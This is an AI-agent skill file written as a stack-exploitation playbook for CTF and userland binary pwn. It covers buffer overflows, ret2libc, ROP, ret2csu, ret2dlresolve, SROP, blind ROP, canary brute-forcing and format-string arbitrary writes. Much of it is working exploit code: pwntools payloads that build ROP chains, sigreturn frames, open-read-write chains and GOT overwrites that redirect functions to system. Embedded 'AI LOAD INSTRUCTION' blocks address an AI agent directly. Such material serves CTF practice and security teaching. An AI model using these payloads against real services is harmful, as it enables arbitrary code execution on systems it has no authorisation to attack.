---
name: pwn-stack
description: >-
  Stack exploitation playbook. Covers buffer overflow, ROP chains (ret2libc/ret2csu/ret2dlresolve/SROP), advanced ROP (BROP/partial overwrite/JOP), RSP alignment for system(), fork-server canary brute-force (1792 attempts), and format string exploitation (%n write/stack pointer chains/FORTIFY bypass). Load for stack-based CTF pwn or userland binary exploitation.
---

# Stack Exploitation — Complete Playbook

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Stack Overflow & ROP |
| 2 | Advanced ROP Techniques |
| 3 | Format String Exploitation |

---
# Part 1: Stack Overflow & ROP


# SKILL: Stack Overflow & ROP — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert stack-based exploitation techniques. Covers classic buffer overflow, return-to-libc, ROP chain construction, ret2csu, ret2dlresolve, SROP, stack pivoting, and canary bypass. Distilled from ctf-wiki advanced-rop, real-world CVEs, and CTF competition patterns. Base models often miss the nuance of gadget selection under constrained conditions.

## 0. RELATED ROUTING

- [format-string-exploitation](../format-string-exploitation/SKILL.md) — leak canary/libc/PIE base via format string before triggering overflow
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — systematic bypass of NX, ASLR, PIE, canary, RELRO
- [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) — convert a write primitive (GOT, hooks, vtable) into code execution
- [heap-exploitation](../heap-exploitation/SKILL.md) — when the vulnerability is in heap rather than stack

### Advanced Reference

Load [ROP_ADVANCED_TECHNIQUES.md](./ROP_ADVANCED_TECHNIQUES.md) when you need:
- Blind ROP (BROP) methodology against remote services without binary
- ret2vdso for ASLR bypass on 32-bit systems
- Partial overwrite techniques for PIE bypass
- JOP / COP alternative code-reuse paradigms


## 1. STACK LAYOUT FUNDAMENTALS

```
High Address
┌─────────────────────┐
│   ...  (caller)     │
├─────────────────────┤
│   Return Address    │  ← overwrite target (EIP/RIP control)
├─────────────────────┤
│   Saved EBP/RBP     │  ← overwrite for stack pivoting
├─────────────────────┤
│   Canary (if enabled)│
├─────────────────────┤
│   Local Variables    │  ← buffer starts here
├─────────────────────┤
│   ...               │
└─────────────────────┘
Low Address
```

| Element | x86 (32-bit) | x86-64 (64-bit) |
|---|---|---|
| Return address size | 4 bytes | 8 bytes |
| Saved frame pointer | 4 bytes (EBP) | 8 bytes (RBP) |
| Canary size | 4 bytes | 8 bytes |
| Calling convention | args on stack | RDI, RSI, RDX, RCX, R8, R9 then stack |
| Syscall instruction | `int 0x80` | `syscall` |

---

## 2. RETURN-TO-LIBC

When NX is enabled (stack not executable), redirect execution to libc functions.

### Classic ret2libc (32-bit)

```python
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)      # fake return address for system()
payload += p32(binsh_addr)     # arg1: "/bin/sh"
```

### ret2libc (64-bit) — Need Gadgets for Arguments

```python
pop_rdi = elf_base + 0x401234  # pop rdi; ret
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

### Libc Base Leak Methods

| Method | Technique | When |
|---|---|---|
| puts@plt(puts@GOT) | Leak resolved libc address | GOT already resolved, puts in PLT |
| write@plt(1, read@GOT, 8) | Leak via write syscall | write available |
| printf("%s", GOT_entry) | Leak via format string | printf controllable |
| Partial overwrite | Overwrite low bytes of return to reach leak gadget | PIE enabled, known last 12 bits |

```python
# Typical leak pattern
rop = b'A' * offset
rop += p64(pop_rdi) + p64(elf.got['puts'])
rop += p64(elf.plt['puts'])
rop += p64(main_addr)  # return to main for second payload

io.sendline(rop)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
```

### one_gadget — Single Gadget RCE

```bash
$ one_gadget /path/to/libc.so.6
0x4f3d5  execve("/bin/sh", rsp+0x40, environ)
  constraints: rsp & 0xf == 0, rcx == NULL
0x4f432  execve("/bin/sh", rsp+0x40, environ)
  constraints: [rsp+0x40] == NULL
```

Constraints must be satisfied — check register/stack state before using.

---

## 3. ROP CHAIN CONSTRUCTION

### Tool Comparison

| Tool | Strength | Command |
|---|---|---|
| ROPgadget | Comprehensive search, chain generation | `ROPgadget --binary elf --ropchain` |
| ropper | Semantic search, JOP/COP support | `ropper -f elf --search "pop rdi"` |
| pwntools ROP | Automated chain building | `rop = ROP(elf); rop.call('system', ['/bin/sh'])` |
| xrop | Fast gadget search | `xrop -r elf` |

### Essential Gadget Patterns

| Purpose | Gadget | Use Case |
|---|---|---|
| Set RDI (arg1) | `pop rdi; ret` | Most function calls |
| Set RSI (arg2) | `pop rsi; pop r15; ret` | Two-arg functions |
| Set RDX (arg3) | `pop rdx; ret` (rare) | Three-arg functions, use ret2csu |
| Syscall | `syscall; ret` | Direct syscall invocation |
| Stack pivot | `leave; ret` | Move RSP to controlled buffer |
| Align stack | `ret` (single ret gadget) | Fix 16-byte alignment for movaps |

**x86-64 stack alignment**: `system()` and other libc functions use `movaps` which requires RSP % 16 == 0. Insert an extra `ret` gadget before the call if alignment is off.

---

## 4. ret2csu — Universal 3-Argument Control

`__libc_csu_init` exists in nearly all dynamically linked ELF binaries and provides controlled calls with up to 3 arguments.

```nasm
; Gadget 1 (csu_init + 0x3a): pop registers
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; call target (function pointer address)
pop r13     ; arg3 (rdx)
pop r14     ; arg2 (rsi)
pop r15     ; arg1 (edi = r15d)
ret

; Gadget 2 (csu_init + 0x20): controlled call
mov rdx, r13
mov rsi, r14
mov edi, r15d    ; NOTE: only sets edi (32-bit), not full rdi
call [r12 + rbx*8]
add rbx, 1
cmp rbp, rbx
jne <loop>
; falls through to gadget 1 again
```

**Key constraints**: r12 must point to a **pointer** to the target function (e.g., GOT entry), not the function address directly. Set `rbx=0`, `rbp=1` to skip the loop.

---

## 5. ret2dlresolve

Forge ELF dynamic linking structures to resolve an arbitrary function (e.g., `system`) without a libc leak.

### Attack Flow

1. Control execution to call `_dl_runtime_resolve(link_map, reloc_offset)`
2. Forge `Elf_Rel` at known writable address pointing to fake `Elf_Sym`
3. Forge `Elf_Sym` with `st_name` pointing to fake string `"system\x00"`
4. Set `reloc_offset` so resolver uses forged structures
5. Argument (`/bin/sh`) placed on stack or in known buffer

```python
# pwntools automation (recommended)
from pwntools import *
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
io.sendline(rop.chain())
io.sendline(dlresolve.payload)
```

### 32-bit vs 64-bit Differences

| Aspect | 32-bit | 64-bit |
|---|---|---|
| Relocation type | `Elf32_Rel` (8 bytes) | `Elf64_Rela` (24 bytes) |
| Symbol table entry | `Elf32_Sym` (16 bytes) | `Elf64_Sym` (24 bytes) |
| Alignment | Relaxed | Strict (must satisfy `ndx = (reloc_offset) / sizeof(Elf64_Rela)`, then `sym = symtab[ndx]`) |
| Version check | Usually skippable | `VERSYM[sym_index]` must be valid or 0 |

---

## 6. SROP — Sigreturn-Oriented Programming

Abuse the `sigreturn` syscall to set **all registers at once** from a fake Signal Frame on the stack.

```python
from pwn import *
frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_addr
frame.rsp = new_stack_addr  # optional pivot

payload = b'A' * offset
payload += p64(pop_rax_ret) + p64(15)  # SYS_rt_sigreturn = 15
payload += p64(syscall_ret)
payload += bytes(frame)
```

**When to use**: limited gadgets, no `pop rdx`, static binary, or need to pivot stack to arbitrary address.

---

## 7. STACK PIVOTING

Move the stack pointer to an attacker-controlled buffer when overflow length is limited.

| Technique | Gadget | Precondition |
|---|---|---|
| `leave; ret` | `mov rsp, rbp; pop rbp; ret` | Control saved RBP to point to fake stack |
| `xchg rsp, rax; ret` | Swap RSP with RAX | Control RAX (via gadget chain) |
| `pop rsp; ret` | Direct RSP control | Rare but powerful |
| SROP pivot | Set RSP in SigreturnFrame | Only need sigreturn gadget |

### leave;ret Pivot Pattern

```
Overflow: [AAAA...][fake_rbp → buf][leave_ret_addr]
  1st leave: rsp = rbp → fake_rbp;  pop rbp → *fake_rbp
  1st ret:   rip = leave_ret_addr
  2nd leave: rsp = new_rbp → buf+8; pop rbp → *(buf)
  2nd ret:   rip = *(buf+8) → start of ROP chain in buf
```

---

## 8. CANARY BYPASS

| Technique | Condition | Method |
|---|---|---|
| Brute-force | `fork()` server (canary same in child) | Byte-by-byte (256 × 7 = 1792 attempts for 64-bit) |
| Format string leak | printf(user_input) available | `%N$p` to read canary from stack |
| Stack reading | One-byte overflow or partial read | Overwrite canary null byte, read via error/output |
| Thread canary | Overflow reaches TLS | Overwrite `stack_guard` in TLS (at `fs:[0x28]`) simultaneously |
| Information disclosure | Uninitialized stack variable leak | Canary included in leaked data |

---

## 9. TOOLS QUICK REFERENCE

```bash
checksec ./binary                          # Show protections (NX, canary, PIE, RELRO)
ROPgadget --binary ./binary --ropchain     # Auto-generate ROP chain
ropper -f ./binary --search "pop rdi"      # Semantic gadget search
one_gadget ./libc.so.6                     # Find one-shot RCE gadgets
pwn template ./binary --host x --port y    # Generate pwntools exploit skeleton
```

---

## 10. DECISION TREE

```
Binary has stack overflow?
├── checksec: NX disabled?
│   └── YES → shellcode on stack, ret to buffer (ret2shellcode)
│   └── NO (NX enabled) →
│       ├── Canary enabled?
│       │   ├── YES → fork() server? → brute-force canary
│       │   │         format string? → leak canary
│       │   │         info leak?     → read canary
│       │   └── NO → proceed to ROP
│       ├── ASLR/PIE enabled?
│       │   ├── PIE → leak code base (partial overwrite last 12 bits, or info leak)
│       │   ├── ASLR only → leak libc base (puts@GOT, write@GOT)
│       │   └── Neither → addresses known, direct ROP
│       ├── Can leak libc?
│       │   ├── YES → ret2libc (system/execve) or one_gadget
│       │   └── NO → ret2dlresolve (forge resolution) or SROP
│       ├── Need 3+ args but no pop rdx?
│       │   └── ret2csu or SROP
│       ├── Overflow too short for full chain?
│       │   └── Stack pivot (leave;ret, xchg rsp)
│       ├── Static binary (no libc)?
│       │   └── SROP + syscall chain (execve via sigreturn)
│       └── Full RELRO?
│           └── Cannot overwrite GOT → target __free_hook, __malloc_hook,
│               or _IO_FILE vtable (see ../arbitrary-write-to-rce/)
```


---
# Part 2: Advanced ROP Techniques


## 1. BLIND ROP (BROP)

Exploit a remote stack overflow **without access to the binary**. Requires a service that forks (canary and ASLR layout persist across crashes).

### BROP Attack Phases

| Phase | Goal | Method |
|---|---|---|
| 1. Stack reading | Determine buffer offset + canary | Byte-by-byte brute-force (child process crash = wrong byte) |
| 2. Find stop gadget | Address that doesn't crash | Scan code section for `ret` into valid code (e.g., infinite loop, `sleep`) |
| 3. Find BROP gadget | `__libc_csu_init` gadget | Scan for 6-pop pattern: probe address, if crash after 6 pops+ret → BROP gadget |
| 4. Find puts/write PLT | Function to leak memory | Probe PLT entries: set RDI to known readable, call candidate, check for output |
| 5. Dump binary | Leak .text, .got, .dynamic | Use puts(addr) to read binary from memory page by page |
| 6. Standard ROP | Build exploit with leaked binary | ROPgadget on dumped binary, ret2libc |

### BROP Gadget Identification

The `__libc_csu_init` tail pops 6 registers then returns. Probe:

```
[overflow][canary][saved_rbp][candidate_addr][A][A][A][A][A][A][stop_gadget]
                                              rbx rbp r12 r13 r14 r15
```

If the process survives (reaches stop gadget) → candidate is a 6-pop gadget (high probability = BROP gadget).

### Trap Gadget vs Stop Gadget

- **Stop gadget**: address that causes the process to hang or respond predictably (not crash)
- **Trap gadget**: address that crashes (0x0, unmapped page) — used as a probe terminator

### PLT Identification

PLT entries are at fixed 16-byte intervals. Probe: set RDI to a known readable address, iterate PLT base + N*16, check if output appears on socket → found puts/write.


## 2. ret2vdso (32-bit ASLR Bypass)

The vDSO (virtual Dynamic Shared Object) is a kernel-mapped page containing optimized syscall stubs. On **32-bit Linux kernels < 3.18**, vDSO was mapped at a **fixed address** or with low entropy.

### Attack Method

1. Locate `sigreturn` gadget in vDSO (fixed or brute-forceable address)
2. Use SROP via vDSO's sigreturn to set all registers
3. Execute `execve("/bin/sh", 0, 0)` via syscall

| Kernel Version | vDSO ASLR | Entropy |
|---|---|---|
| < 2.6.18 (32-bit) | Fixed at 0xffffe000 | None |
| 2.6.18–3.17 (32-bit) | 1 page randomization | ~8 bits (256 positions) |
| ≥ 3.18 (32-bit) | Full ASLR | Same as mmap |
| 64-bit | Always randomized | Full ASLR |

**Modern relevance**: Limited to legacy 32-bit systems. On 64-bit, vDSO is fully randomized.

---

## 3. PARTIAL OVERWRITE (PIE Bypass)

When PIE is enabled, the code base is randomized but the **last 12 bits** (page offset) are always fixed. Overwriting only the lowest 1–2 bytes of a return address can redirect execution within the same page or to a nearby page.

### Technique

```
Original return address: 0x5555555551?? (last 12 bits = 0x1??, fixed)
Overwrite last 2 bytes:  0x555555551234 → redirect to offset 0x1234 in binary

If only last byte overwritten (no null terminator issue):
  Only 4 bits unknown (nibble brute-force = 16 attempts)
If last 2 bytes overwritten:
  Only 4 bits unknown (page alignment) = 16 attempts
```

### When to Use

| Scenario | Technique |
|---|---|
| PIE + no info leak | Partial overwrite low bytes of return address |
| PIE + one-byte overflow | Overwrite saved RBP low byte → misaligned frame → secondary leak |
| PIE + format string | Leak full PIE base first (preferred over partial overwrite) |

### Practical Notes

- Null bytes in addresses: 64-bit addresses typically contain `\x00` in upper bytes, making overflow-based overwrites write the null terminator naturally
- Probability: partial overwrite success depends on unknown nibble (1/16 per attempt)
- Combine with fork-based brute-force if process restarts with same layout

---

## 4. JOP — Jump-Oriented Programming

Alternative to ROP using indirect `jmp` instructions instead of `ret`.

### Dispatcher Gadget Pattern

```nasm
; Dispatcher: advances a "virtual PC" table and jumps to next gadget
add rax, 8       ; advance table pointer
jmp [rax]        ; jump to next functional gadget
```

Each functional gadget ends with `jmp [rax]` (or equivalent) to return to the dispatcher.

### JOP Gadget Types

| Type | Example | Purpose |
|---|---|---|
| Dispatcher | `add rax, 8; jmp [rax]` | Sequence control |
| Functional | `pop rdi; jmp [rax]` | Register setup |
| Initializer | Sets RAX to dispatch table address | Bootstrap |

### When JOP Matters

- **CET/Shadow Stack**: Intel CET marks `ret` with shadow stack validation — ROP returns fail, but `jmp` gadgets are not checked by shadow stack (though IBT may restrict indirect jumps)
- Some binaries have abundant `jmp` gadgets but few `ret` gadgets

---

## 5. COP — Call-Oriented Programming

Uses indirect `call` instructions. Each gadget ends with `call [reg]` to chain to the next.

```nasm
; Example COP gadget
mov rdi, rbx
call [rax + 0x10]   ; chains to next gadget via function pointer table
```

### COP vs ROP vs JOP Comparison

| Aspect | ROP | JOP | COP |
|---|---|---|---|
| Chaining mechanism | `ret` | `jmp [reg]` | `call [reg]` |
| Stack consumption | Yes (RSP advances) | No (table-based) | Yes (pushes return addr) |
| CET Shadow Stack | Blocked | Not directly blocked | Partially blocked (IBT) |
| Gadget availability | Most common | Moderate | Least common |
| Complexity | Low | High (need dispatcher) | High |

---

## 6. STACK-BASED ORW (open-read-write)

When `execve` is blocked by seccomp but `open`/`read`/`write` are allowed, build a ROP chain to read the flag file.

### x86-64 Syscall Numbers for ORW

| Syscall | Number | Args |
|---|---|---|
| `open` (or `openat`) | 2 (257) | RDI=path, RSI=flags, RDX=mode |
| `read` | 0 | RDI=fd, RSI=buf, RDX=count |
| `write` | 1 | RDI=fd(1), RSI=buf, RDX=count |

```python
# ORW ROP chain skeleton
rop = b''
# open("flag", O_RDONLY)
rop += p64(pop_rdi) + p64(flag_str_addr)
rop += p64(pop_rsi_r15) + p64(0) + p64(0)
rop += p64(pop_rax) + p64(2) + p64(syscall_ret)
# read(fd=3, buf, 0x100)
rop += p64(pop_rdi) + p64(3)
rop += p64(pop_rsi_r15) + p64(buf_addr) + p64(0)
rop += p64(pop_rdx) + p64(0x100)
rop += p64(pop_rax) + p64(0) + p64(syscall_ret)
# write(1, buf, 0x100)
rop += p64(pop_rdi) + p64(1)
rop += p64(pop_rsi_r15) + p64(buf_addr) + p64(0)
rop += p64(pop_rdx) + p64(0x100)
rop += p64(pop_rax) + p64(1) + p64(syscall_ret)
```

---

## 7. ret2csu EXTENDED PATTERNS

### Variant: Using csu_init for Indirect Call to GOT

```python
csu_pop = elf_base + 0x40123a  # pop rbx..r15; ret
csu_call = elf_base + 0x401220 # mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]

payload = b'A' * offset
payload += p64(csu_pop)
payload += p64(0)             # rbx = 0
payload += p64(1)             # rbp = 1 (skip loop)
payload += p64(elf.got['write'])  # r12 → call *GOT[write]
payload += p64(8)             # r13 → rdx = 8 (count)
payload += p64(elf.got['puts'])   # r14 → rsi = GOT[puts] (leak)
payload += p64(1)             # r15 → edi = 1 (stdout)
payload += p64(csu_call)
payload += b'A' * 56          # padding for 7 pops after call
payload += p64(main_addr)     # return to main
```

### When ret2csu Fails

- **PIE enabled**: csu gadget addresses unknown (need leak first)
- **Static binary**: `__libc_csu_init` may not exist → fall back to SROP
- **Only `edi` set**: r15d → edi (32-bit zero-extended), cannot set full 64-bit RDI → use supplementary `pop rdi` if available

---

## 8. ARCHITECTURE-SPECIFIC NOTES

### ARM ROP

| Aspect | ARM32 | AArch64 |
|---|---|---|
| Return register | LR (R14) | LR (X30) |
| Key gadget | `pop {r0-r3, pc}` | `ldp x29, x30, [sp]; ret` |
| Syscall | `svc #0` | `svc #0` |
| NOP sled | `mov r0, r0` (0xe1a00000) | `nop` (0xd503201f) |
| Thumb mode | Mixed ARM/Thumb gadgets | N/A (A64 only) |

### MIPS ROP

- No NX by default (stack executable on many MIPS devices) → shellcode often viable
- Branch delay slots: instruction after branch always executes
- Gadget: `jalr $t9` with `$a0`–`$a3` for args
- Cache coherency: may need `sleep(1)` between write and execute for I-cache flush

---

## 9. TOOLCHAIN CHEAT SHEET

```bash
# Find specific gadgets
ROPgadget --binary ./pwn --only "pop|ret" | grep rdi
ropper -f ./pwn --search "pop rdi; ret"

# Auto-generate chain
ROPgadget --binary ./pwn --ropchain

# Find one_gadget constraints
one_gadget ./libc.so.6 -l 2  # level 2 = more results, looser constraints

# Verify gadget in GDB
gdb ./pwn -ex "x/3i 0x401234"

# pwntools template
pwn template --host remote.ctf --port 1337 ./pwn > exploit.py
```


---
# Part 3: Format String Exploitation


# SKILL: Format String Exploitation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert format string techniques. Covers stack reading, arbitrary write via %n, GOT overwrite, __malloc_hook overwrite, pointer chain exploitation, blind format string, FORTIFY_SOURCE bypass, 64-bit null byte handling, and pwntools automation. Distilled from ctf-wiki fmtstr, CTF patterns, and real-world scenarios. Base models often miscalculate positional parameter offsets or forget 64-bit address placement after format string.

## 0. RELATED ROUTING

- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) — combine format string leak with stack overflow for full exploit
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — format string is the primary canary/PIE/ASLR leak method
- [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) — convert format string write primitive to code execution targets
- [heap-exploitation](../heap-exploitation/SKILL.md) — heap address leak via format string for heap exploitation


## 1. VULNERABILITY IDENTIFICATION

### Vulnerable Pattern

```c
printf(user_input);          // VULNERABLE: user controls format string
fprintf(fp, user_input);     // VULNERABLE
sprintf(buf, user_input);    // VULNERABLE
snprintf(buf, sz, user_input); // VULNERABLE

printf("%s", user_input);    // SAFE: format string is fixed
```

### Quick Test

```
Input: AAAA%p%p%p%p%p%p%p%p
If output shows stack values (hex addresses): format string confirmed
Look for 0x4141414141414141 in output to find your input offset
```

---

## 2. READING MEMORY

### Stack Leak (%p)

| Format | Action | Use |
|---|---|---|
| `%p` | Print next stack value as pointer | Sequential stack dump |
| `%N$p` | Print N-th parameter as pointer | Direct positional access |
| `%N$lx` | Same as %p but explicit hex (64-bit) | Portable |
| `%N$s` | Dereference N-th parameter as string pointer | Read memory at pointer value |

### Finding Your Input Offset

```python
# Send: AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
# Output: AAAAAAAA.0x7ffd12340000.0x0.(nil).0x7f1234567890.0x4141414141414141...
#                                                           ↑ offset = 6 (example)
# Or automated:
for i in range(1, 30):
    io.sendline(f'AAAA%{i}$p')
    if '0x41414141' in io.recvline():
        print(f'Offset = {i}')
        break
```

### Leaking Specific Values

| Target | Method | Stack Position |
|---|---|---|
| Canary | `%N$p` where N = canary offset from format string | Typically at offset buf_size/8 + few |
| Saved RBP | `%N$p` (just above return address) | Leaks stack address → stack base |
| Return address | `%N$p` | Leaks .text address (PIE base = leak & ~0xfff - offset) |
| Libc address | `%N$p` where N points to `__libc_start_main+XX` return on stack | libc base = leak - offset |

### Reading Arbitrary Address (%s)

```
# 32-bit: place address at start of format string
payload = p32(target_addr) + b'%N$s'  # N = offset where target_addr appears on stack

# 64-bit: address contains null bytes → place AFTER format specifiers
payload = b'%8$sAAAA' + p64(target_addr)  # %8$s reads from offset 8 where address is
```

---

## 3. WRITING MEMORY (%n)

### Write Specifiers

| Specifier | Bytes Written | Width |
|---|---|---|
| `%n` | 4 bytes (int) | Characters printed so far |
| `%hn` | 2 bytes (short) | Characters printed so far (mod 0x10000) |
| `%hhn` | 1 byte (char) | Characters printed so far (mod 0x100) |
| `%ln` | 8 bytes (long) | Characters printed so far |

### Arbitrary Write Technique

**Goal**: Write value `V` to address `A`.

**32-bit** (address on stack directly):
```python
# Write 2 bytes at a time using %hn
# Place target addresses in format string (they'll be on stack)
payload  = p32(target_addr)       # for low 2 bytes
payload += p32(target_addr + 2)   # for high 2 bytes
# Calculate padding for each %hn write
low = value & 0xffff
high = (value >> 16) & 0xffff
payload += f'%{low - 8}c%{offset}$hn'.encode()
payload += f'%{(high - low) & 0xffff}c%{offset+1}$hn'.encode()
```

**64-bit** (address AFTER format string):
```python
# Addresses contain null bytes (0x00007fXXXXXXXX) which terminate string
# Solution: place addresses AFTER the format specifiers

# Step 1: format string portion (no null bytes)
fmt = b'%Xc%N$hn%Yc%M$hn'
# Step 2: pad to 8-byte alignment
fmt = fmt.ljust(align, b'A')
# Step 3: append target addresses
fmt += p64(target_addr)
fmt += p64(target_addr + 2)
```

### Byte-by-Byte Write with %hhn

Write one byte at a time for precision (6 writes for full 48-bit address on 64-bit):

```python
writes = {}
for i in range(6):
    byte_val = (value >> (i * 8)) & 0xff
    writes[target_addr + i] = byte_val

# pwntools handles the math:
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
```

---

## 4. PWNTOOLS fmtstr_payload()

```python
from pwn import *

# Overwrite GOT entry with target address
payload = fmtstr_payload(
    offset,                    # stack offset where input appears
    {elf.got['printf']: libc.symbols['system']},  # {addr: value}
    numbwritten=0,             # bytes already output before our input
    write_size='short'         # 'byte', 'short', or 'int'
)

# For 64-bit with addresses after format string:
# fmtstr_payload handles this automatically
```

### FmtStr Class (Interactive Exploitation)

```python
from pwn import *

def send_payload(payload):
    io.sendline(payload)
    return io.recvline()

fmt = FmtStr(execute_fmt=send_payload)
# fmt.offset is auto-detected
fmt.write(elf.got['printf'], libc.symbols['system'])
fmt.execute_writes()
```

---

## 5. GOT OVERWRITE VIA FORMAT STRING

### Common Targets

| Overwrite | With | Trigger |
|---|---|---|
| `printf@GOT` | `system` | Next `printf(user_input)` → `system(user_input)`, send `/bin/sh` |
| `strlen@GOT` | `system` | If `strlen(user_input)` called |
| `puts@GOT` | `system` | If `puts(user_input)` called |
| `atoi@GOT` | `system` | If `atoi(user_input)` called (send `sh` as "number") |
| `__stack_chk_fail@GOT` | Controlled addr | Bypass canary check entirely |
| `exit@GOT` | `main` | Create infinite loop for multi-shot exploit |

### Hook Targets (glibc < 2.34)

| Target | One-gadget | Trigger |
|---|---|---|
| `__malloc_hook` | one_gadget addr | Any `printf` with large format → internal `malloc` |
| `__free_hook` | `system` | Trigger `free("/bin/sh")` |

---

## 6. STACK POINTER CHAIN EXPLOITATION

When format string is **not directly on the stack** (e.g., stored in a heap buffer referenced by stack pointer), use pointer chains on the stack to achieve arbitrary write.

### Two-Stage Write

```
Stack:
  [offset A] → ptr_X (stack address pointing to another stack address)
  [offset B] → ptr_Y (target of ptr_X)

Stage 1: Use %A$hn to modify ptr_X's low bytes → ptr_X now points to target_addr
Stage 2: Use %B$n to write through the modified ptr_X → writes to target_addr
```

This requires finding **existing pointer chains** on the stack (e.g., saved frame pointers forming a chain: rbp → prev_rbp → prev_prev_rbp).

### Finding Pointer Chains

```python
# Leak stack with %p, look for:
# 1. Stack address A at offset N that points to another stack address B
# 2. Stack address B at offset M
# Modify value at A (using %N$hn) to change where B points
# Then write through B (using %M$hn) to target
```

---

## 7. BLIND FORMAT STRING

Remote service, no binary, no source — exploit format string blind.

### Methodology

| Step | Action | Purpose |
|---|---|---|
| 1 | Send `%p` × 50 | Dump stack, identify address patterns |
| 2 | Identify offsets | Find libc addrs (0x7f...), stack addrs (0x7ff...), code addrs |
| 3 | Find input offset | Send `AAAA%N$p` for N=1..50, find 0x41414141 |
| 4 | Identify binary base | Code addresses reveal PIE base (or fixed base if no PIE) |
| 5 | Leak GOT entries | If binary base known, read GOT via `%N$s` with GOT address |
| 6 | Calculate libc base | GOT value - libc symbol offset |
| 7 | Overwrite GOT | `%n` to rewrite GOT entry with system address |

---

## 8. FORTIFY_SOURCE BYPASS

`FORTIFY_SOURCE` (gcc `-D_FORTIFY_SOURCE=2`) replaces `printf` with `__printf_chk` which **forbids `%N$n`** (positional writes).

### Bypass Techniques

| Method | Detail |
|---|---|
| Use `%hn` sequentially (no positional) | Print exact byte count, `%hn`, adjust, `%hn` — fragile but works |
| Stack-based exploit | If format string is on stack, use non-positional `%n` with stack position control |
| Heap overflow instead | FORTIFY doesn't protect heap — combine with heap bug |
| Return-to-printf | ROP to call unfortified `printf` (if available in binary or libc) |

---

## 9. 64-BIT CONSIDERATIONS

| Challenge | Solution |
|---|---|
| Addresses contain `\x00` (null byte terminates format string) | Place addresses AFTER format specifiers, pad to alignment |
| Address width: 6 significant bytes | Write 3 × `%hn` (2 bytes each) or 6 × `%hhn` |
| Larger stack offset range | Input may be at offset 6+ due to 6 register args saved |
| 48-bit address space | Only bottom 48 bits of 64-bit used |

### Layout Template (64-bit)

```
[format_string_specifiers][padding_to_8byte_align][addr1][addr2][addr3]...
 ← no null bytes here →                          ← null bytes OK (after fmt) →
```

---

## 10. DECISION TREE

```
Format string vulnerability confirmed (printf(user_input))
├── FORTIFY_SOURCE enabled? (__printf_chk)
│   ├── YES → positional %n blocked
│   │   ├── Sequential %n possible? → non-positional write
│   │   └── Combine with another primitive (heap, ROP)
│   └── NO → full positional %n available
├── What do you need first?
│   ├── Leak canary → %N$p at canary stack offset
│   ├── Leak PIE base → %N$p at return address offset → base = leak - known_offset
│   ├── Leak libc base → %N$p at __libc_start_main return on stack
│   ├── Leak heap base → %N$p at heap pointer on stack
│   └── Leak specific address → %N$s with target address on stack
├── Architecture?
│   ├── 32-bit → addresses at start of format string
│   └── 64-bit → addresses after format string (null byte issue)
├── Write target?
│   ├── Partial RELRO → GOT overwrite (printf→system, atoi→system)
│   ├── Full RELRO → __malloc_hook or __free_hook (pre-2.34)
│   ├── Full RELRO + glibc ≥ 2.34 → target _IO_FILE, exit_funcs, TLS_dtor_list
│   └── Stack return address → direct overwrite (if ASLR bypassed)
├── Single-shot or multi-shot?
│   ├── Loop (multi-shot) → overwrite GOT entry incrementally, use pointer chains
│   └── One-shot → fmtstr_payload() with all writes in single payload
└── Input not on stack? (heap buffer)
    └── Use stack pointer chains for indirect writes
```
